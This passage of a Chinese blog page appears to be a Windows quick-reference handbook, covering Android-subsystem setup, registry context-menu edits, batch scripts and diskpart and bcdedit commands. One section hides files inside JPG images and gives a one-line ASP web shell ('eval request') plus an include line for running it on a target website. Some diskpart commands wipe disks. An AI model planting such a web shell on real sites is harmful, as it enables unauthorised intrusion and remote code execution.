//store.rg-adguard.net/" target="_blank" rel="noopener noreferrer">https://store.rg-adguard.net/<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>然后在搜索框输入</p> <p><a href="https://www.microsoft.com/store/productid/9p3395vx91nr" target="_blank" rel="noopener noreferrer">https://www.microsoft.com/store/productid/9p3395vx91nr<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>通道选择slow即可</p> <p><img src="https://cdn.jsdelivr.net/gh/Superdeeep/photo/Androidsubsystemfetch.png" alt=""></p> <p>找到最下面的最大的msixbundle文件</p> <p><img src="https://cdn.jsdelivr.net/gh/Superdeeep/photo/AndroidSubsystemgetooo.png" alt=""></p> <p>下载之后，在文件所在目录打开powershell</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">Add-AppxPackage</span> <span class="token string">&quot;MicrosoftCorporationII.WindowsSubsystemForAndroid_2208.40000.5.0_neutral_~_8wekyb3d8bbwe.Msixbundle&quot;</span>
</code></pre></div><p>名字不固定，需要看着更改</p> <p>进入设置 → 应用 → 可选功能 → 更多 Windows 功能，找到并勾选开启「虚拟机平台」两个选项，完成后会提示重启系统。（Hyper-V并不是必须的）</p> <p>如果不能启动安卓子系统可以试着在BIOS设置中找到Intel虚拟化相关选项，试着打开一下</p> <p>如果改崩了开不了机就恢复BIOS默认设置继续改（不要怂就是干😎）</p> <p>附上一个安卓子系统助手，晨种酱开发的捏~(￣▽￣)~</p> <p><a href="https://ondrive.vercel.app/api/raw/?path=/AndroidSubTool/%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%8A%A9%E6%89%8B_V1.0.zip" target="_blank" rel="noopener noreferrer">https://ondrive.vercel.app/api/raw/?path=/AndroidSubTool/%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%8A%A9%E6%89%8B_V1.0.zip<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></details> <details class="custom-block details"><summary>图片藏exe</summary> <p>同理也可以藏木马</p> <p>以藏PVW32Con.exe（识别图片分辨率等信息的软件）为例</p> <p>准备好PVW32Con.ico</p> <p>把PVW32Con.exe压缩，得到PVW32Con.zip</p> <p>之后使用cmd输入：</p> <div class="language-sh extra-class"><pre class="language-sh"><code> copy PVW32Con.ico/b+PVW32Con.zip/b PVW32Con.jpg
</code></pre></div><p>之后便可以得到PVW32Con.jpg，用压缩软件打开图片即可看到PVW32Con.exe，同时图片可以正常浏览。</p> <p>一句话木马为：</p> <div class="language-sh extra-class"><pre class="language-sh"><code>copy <span class="token number">1</span>.jpg/b+1.asp/a <span class="token number">2</span>.jpg
</code></pre></div><p>/b   意思是二进制文件</p> <p>/a   意思是ASCII码文件</p> <p>asp文件内容 <code>&lt;%eval request(&quot;value&quot;)%&gt;</code></p> <p>把<code>&lt;% #include files=”2.jpg”%&gt;</code>放入目标网站，即可执行asp</p></details> <details class="custom-block details"><summary>Windows聚焦图片文件位置</summary> <p>C:\Users\你的用户名\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets</p></details> <details class="custom-block details"><summary>去除开始菜单的chrome背景色</summary> <p>找到chrome的位置</p> <p>删除chrome.VisualElementsManifest.xml即可</p></details> <details class="custom-block details"><summary>全面控制面板（上帝模式）</summary> <p>新建文件夹</p> <p>重命名为
.{ED7BA470-8E54-465E-825C-99712043E01C}</p></details> <details class="custom-block details"><summary>为右键菜单增加Terminal等</summary> <p>1、删除Windows Terminal自带右键菜单</p> <p>删除：</p> <div class="language-r extra-class"><pre class="language-r"><code><span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked<span class="token punctuation">]</span>
<span class="token string">&quot;{9F156763-7844-4DC4-B2B1-901F640F5155}&quot;</span><span class="token operator">=</span><span class="token string">&quot;WindowsTerminal&quot;</span>
</code></pre></div><p>添加：</p> <div class="language-r extra-class"><pre class="language-r"><code><span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked<span class="token punctuation">]</span>
<span class="token string">&quot;{9F156763-7844-4DC4-B2B1-901F640F5155}&quot;</span><span class="token operator">=</span><span class="token operator">-</span>
</code></pre></div><p>原理添加类似于添加黑名单</p> <p>2、添加自己的Windows Terminal</p> <p>图标在此：https://cdn.jsdelivr.net/gh/Superdeeep/photo/ico.zip</p> <div class="language-r extra-class"><pre class="language-r"><code><span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\Terminal<span class="token punctuation">]</span>
<span class="token string">&quot;Icon&quot;</span><span class="token operator">=</span><span class="token string">&quot;C:\\Program Files\\wt.ico&quot;</span> <span class="token punctuation">;</span>图标文件存储位置<span class="token punctuation">,</span>下同
<span class="token operator">@</span><span class="token operator">=</span><span class="token string">&quot;Open in Terminal&quot;</span>

<span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\Terminal\command<span class="token punctuation">]</span>
<span class="token operator">@</span><span class="token operator">=</span><span class="token string">&quot;C:\\Users\\你的用户名\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -p \&quot;Command Prompt\&quot; -d .&quot;</span>
</code></pre></div><p>其他</p> <p>添加shift+右键管理员打开cmd以及普通的powershell</p> <div class="language-r extra-class"><pre class="language-r"><code>
<span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd<span class="token punctuation">]</span>
<span class="token operator">@</span><span class="token operator">=</span><span class="token string">&quot;@shell32.dll,-8506&quot;</span>
<span class="token string">&quot;Extended&quot;</span><span class="token operator">=</span><span class="token string">&quot;&quot;</span>
<span class="token string">&quot;NoWorkingDirectory&quot;</span><span class="token operator">=</span><span class="token string">&quot;&quot;</span>
<span class="token string">&quot;CommandFlags&quot;</span><span class="token operator">=</span>dword<span class="token operator">:</span><span class="token number">00000008</span>

<span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd\command<span class="token punctuation">]</span>
<span class="token operator">@</span><span class="token operator">=</span><span class="token string">&quot;cmd.exe /s /k pushd \&quot;%V\&quot;&quot;</span>


<span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\Powershell<span class="token punctuation">]</span>
<span class="token operator">@</span><span class="token operator">=</span><span class="token string">&quot;@shell32.dll,-8508&quot;</span>
<span class="token string">&quot;Extended&quot;</span><span class="token operator">=</span><span class="token string">&quot;&quot;</span>
<span class="token string">&quot;NoWorkingDirectory&quot;</span><span class="token operator">=</span><span class="token string">&quot;&quot;</span>
<span class="token string">&quot;ShowBasedOnVelocityId&quot;</span><span class="token operator">=</span>dword<span class="token operator">:</span><span class="token number">00639</span>bc8
<span class="token string">&quot;Icon&quot;</span><span class="token operator">=</span><span class="token string">&quot;C:\\Program Files\\powershell.ico&quot;</span>

<span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\Powershell\command<span class="token punctuation">]</span>
<span class="token operator">@</span><span class="token operator">=</span><span class="token string">&quot;powershell.exe -noexit -command Set-Location -literalPath '%V'&quot;</span>

<span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\runas<span class="token punctuation">]</span>
<span class="token operator">@</span><span class="token operator">=</span><span class="token string">&quot;&quot;</span>
<span class="token string">&quot;Extended&quot;</span><span class="token operator">=</span>dword<span class="token operator">:</span><span class="token number">00000000</span>
<span class="token string">&quot;Icon&quot;</span><span class="token operator">=</span><span class="token string">&quot;C:\\Program Files\\cmd.ico&quot;</span>

<span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\runas\command<span class="token punctuation">]</span>
<span class="token string">&quot;ShowBasedOnVelocityId&quot;</span><span class="token operator">=</span>dword<span class="token operator">:</span><span class="token number">00639</span>bc8
<span class="token operator">@</span><span class="token operator">=</span><span class="token string">&quot;cmd.exe /s /k pushd \&quot;%V\&quot;&quot;</span>

</code></pre></div></details> <details class="custom-block details"><summary>批量筛选图片</summary> <p>需要用到pvw32con.exe</p> <p>请下载如下的图片，请不要直接拖出来，是下载该图片</p> <p>请确保文件名为 PVW32Con.exe.jpg</p> <p><img src="https://cdn.jsdelivr.net/gh/Superdeeep/photo/PVW32Con.exe.jpg" alt=""></p> <p>下载完成后，不要修改后缀名（修改成压缩包后缀名是无法打开的），直接用压缩软件打开，即可看到pvw32con.exe，之后你可以把它解压出来。</p> <p>以下为复制Windows聚焦图片并筛选出1920X1080的图片，并把筛选出的图片放到桌面的脚本</p> <p>请把脚本和PVW32Con.exe放在同一目录下后再运行脚本</p> <div class="language-sh extra-class"><pre class="language-sh"><code>@color 0a
md C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>%username%<span class="token punctuation">\</span>desktop<span class="token punctuation">\</span>wallpaper
md C:<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>wallpaper<span class="token punctuation">\</span>
copy <span class="token string">&quot;C:\Users\%username%\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets&quot;</span> <span class="token string">&quot;C:<span class="token entity" title="\t">\t</span>emp\wallpaper<span class="token entity" title="\&quot;">\&quot;</span>
cd &quot;</span>C:<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>wallpaper<span class="token punctuation">\</span>&quot;
ren *.? *.jpg
<span class="token builtin class-name">set</span> <span class="token string">&quot;mulu=C:<span class="token entity" title="\t">\t</span>emp\wallpaper<span class="token entity" title="\&quot;">\&quot;</span>
set &quot;</span>www<span class="token operator">=</span><span class="token number">1920</span><span class="token string">&quot;

set &quot;</span>path<span class="token operator">=</span>%path%<span class="token punctuation">;</span>%~dp0<span class="token string">&quot;
pushd &quot;</span>%mulu%<span class="token punctuation">\</span>&quot;

<span class="token operator">&gt;</span><span class="token string">&quot;%temp%\.p&quot;</span> <span class="token punctuation">(</span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;%cd%&quot;</span>
    <span class="token function">dir</span> /a:d /s /b
<span class="token punctuation">)</span>

<span class="token keyword">for</span> /f <span class="token string">&quot;usebackq delims=&quot;</span> %%P <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">&quot;%temp%\.p&quot;</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span>
    <span class="token keyword">if</span> exist <span class="token string">&quot;%%~P\*.jpg&quot;</span> <span class="token punctuation">(</span>
        <span class="token operator">&gt;</span><span class="token string">&quot;%temp%\.p&quot;</span> pvw32con <span class="token string">&quot;%%~P\*.jpg&quot;</span>
        <span class="token keyword">for</span> /f <span class="token string">&quot;usebackq tokens=1,2 delims=:&quot;</span> %%i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">&quot;%temp%\.p&quot;</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span>
            <span class="token builtin class-name">set</span> <span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token string">&quot;%%~P\%%i&quot;</span>
            <span class="token builtin class-name">set</span> <span class="token assign-left variable">width</span><span class="token operator">=</span>%%j
            <span class="token builtin class-name">set</span> /a width <span class="token operator">=</span> width
            SetLocal EnableDelayedExpansion
            <span class="token keyword">if</span> <span class="token operator">!</span>width<span class="token operator">!</span> lss %www% del /a /f <span class="token operator">!</span>file<span class="token operator">!</span>
            EndLocal
        <span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">)</span>

del <span class="token string">&quot;%temp%\.p&quot;</span>
<span class="token function">popd</span>

copy <span class="token string">&quot;C:<span class="token entity" title="\t">\t</span>emp\wallpaper<span class="token entity" title="\&quot;">\&quot;</span> &quot;</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>%username%<span class="token punctuation">\</span>desktop<span class="token punctuation">\</span>wallpaper<span class="token punctuation">\</span>&quot;
<span class="token builtin class-name">cd</span> &quot;C:<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>&quot;
del wallpaper /q
pause
</code></pre></div></details> <details class="custom-block details"><summary>Winload隐藏磁盘</summary> <div class="language-sh extra-class"><pre class="language-sh"><code>md F:<span class="token punctuation">\</span>RECYCLED<span class="token punctuation">\</span>UDrives.<span class="token punctuation">{</span><span class="token number">25336920</span>-03F9-11CF-8FD0-00AA00686F13<span class="token punctuation">}</span><span class="token operator">&gt;</span>NUL
<span class="token keyword">if</span> exist M:<span class="token punctuation">\</span>NUL goto delete
subst M: F:<span class="token punctuation">\</span>RECYCLED<span class="token punctuation">\</span>UDrives.<span class="token punctuation">{</span><span class="token number">25336920</span>-03F9-11CF-8FD0-00AA00686F13<span class="token punctuation">}</span>
start M:<span class="token punctuation">\</span>
goto end
:delete
subst /D M:
</code></pre></div></details> <details class="custom-block details"><summary>Winload错误</summary> <div class="language-sh extra-class"><pre class="language-sh"><code>rem 先输入：
bcdedit /set <span class="token punctuation">{</span>default<span class="token punctuation">}</span> osdevice boot 回车；
rem 再输入：
bcdedit /set <span class="token punctuation">{</span>default<span class="token punctuation">}</span> device boot 回车；
rem 最后输入：
bcdedit /set <span class="token punctuation">{</span>default<span class="token punctuation">}</span> detecthal <span class="token number">1</span>  回车；
</code></pre></div></details> <details class="custom-block details"><summary>批量重命名</summary> <p>以图片为例</p> <div class="language-sh extra-class"><pre class="language-sh"><code>ren *? *.jpg
</code></pre></div></details> <details class="custom-block details"><summary>打开我的电脑</summary> <div class="language-sh extra-class"><pre class="language-sh"><code>C:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>EXPLORER.EXE /n, /e, ::<span class="token punctuation">{</span>20D04FE0-3AEA-1069-A2D8-08002B30309D<span class="token punctuation">}</span>
</code></pre></div></details> <details class="custom-block details"><summary>Diskpart命令</summary> <p>Diskpart命令
<strong>!!!此命令会清除硬盘内所有数据!!!</strong></p> <ul><li>Diskpart常用命令如下
<ul><li><p>转换为GPT/mbr分区</p> <div class="language-sh extra-class"><pre class="language-sh"><code>diskpart
list disk
<span class="token keyword">select</span> <span class="token assign-left variable">disk</span><span class="token operator">=</span><span class="token number">1</span>
convert gpt
convert mbr
</code></pre></div></li> <li><p>安装系统时磁盘分区</p> <div class="language-sh extra-class"><pre class="language-sh"><code>diskpart
clean   rem 清除物理磁盘所有信息
create partition primary <span class="token assign-left variable">size</span><span class="token operator">=</span><span class="token number">102400</span>   rem 100GB的大小
active   rem 激活主分区
<span class="token function">format</span> quick    rem 快速格式化主分区
</code></pre></div></li> <li><p>创建其他的分区</p> <div class="language-sh extra-class"><pre class="language-sh"><code>create partition primary <span class="token assign-left variable">size</span><span class="token operator">=</span><span class="token number">102400</span>    rem 创建100GB主分区
create partition extended    rem 创建扩扩展分区
create partition logical <span class="token assign-left variable">size</span><span class="token operator">=</span><span class="token number">102400</span>    rem 创建100G逻辑分区
create partition logic    rem 将剩余扩展分区全部作为逻辑分区
delete partition     rem 删除分区
</code></pre></div></li></ul></li></ul></details> <details class="custom-block details"><summary>Windows10预留保留空间管理</summary> <div class="language-sh extra-class"><pre class="language-sh"><code>DISM.exe /Online /Get-ReservedStorageState
DISM.exe /Online /Set-ReservedStorageState /State:Enabled
DISM.exe /Online /Set-ReservedStorageState /State:Disabled
</code></pre></div></details></div></div> <!----> <div class="page-edit"><div class="edit-link"><a href="https://github.com/Superdeeep/code/edit/master/docs/03.笔记和折腾/02.技术笔记/01.Windows笔记/07.Windows速查手册.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="tags"><a href="/tags/?tag=%E9%80%9F%E9%80%9F%E7%9A%84%E6%9F%A5" title="标签">#速速的查</a></div> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/1c6252/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">优雅的使用Windows</div></a> <a href="/pages/ba14ff/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">软件技巧</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
